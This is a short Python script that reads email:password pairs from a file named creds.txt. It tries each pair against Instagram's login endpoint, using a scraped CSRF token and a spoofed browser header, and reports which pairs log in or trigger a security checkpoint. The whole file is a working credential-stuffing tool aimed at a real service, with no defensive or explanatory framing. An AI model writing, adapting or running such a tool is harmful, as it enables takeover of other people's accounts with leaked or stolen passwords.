#!/usr/bin/python

import re
import json
import requests
from bs4 import BeautifulSoup
from datetime import datetime

def InstaLogin(username: str, password: str) -> None:

    main_url = "https://www.instagram.com/accounts/login/"
    login_url = "https://www.instagram.com/accounts/login/ajax/"

    time = int(datetime.now().timestamp())
    response = requests.request(method='GET', url=main_url).text
    csrf_token = re.search('{"csrf_token":"(.*)"},7467]', response).group(1)
    
    payload = {
        'username': username,
        'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{time}:{password}',
        'queryParams': {},
        'optIntoOneTap': 'false'
    }

    login_header = {
        "User-Agent": "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36",
        "X-Requested-With": "XMLHttpRequest",
        "Referer": main_url,
        "x-csrftoken": csrf_token
    }

    login_response = requests.request(method="POST", url=login_url, data=payload, headers=login_header)
    if login_response.headers['Content-Type'] == "application/json; charset=utf-8":
        
        if 'userId' in login_response.json() and 'authenticated' in login_response.json():
            if len(login_response.json()['userId']) > 0 and login_response.json()['authenticated'] == True:
                print("[+] Successfull login. {}:{}".format(username, password))
        elif 'checkpoint_url' in login_response.json():
            print("[+] Possible combinations found. {}:{}".format(username, password))
        else:
            print("[-] Login failed.")
    else:
        print("[-] Invalid response.")
    login_response.close()

with open('creds.txt', encoding='utf-8') as f:
    lines = f.readlines()
    for line in lines:
        try:
            line = line.strip()
            email = line.split(":")[0]
            password = line.split(":")[1]
            password = password if len(password) > 5 else ...
            InstaLogin(email, password)
        except KeyboardInterrupt:
            print("[-] KeyBoardInterrup received. Exiting the program!")
            exit(0)
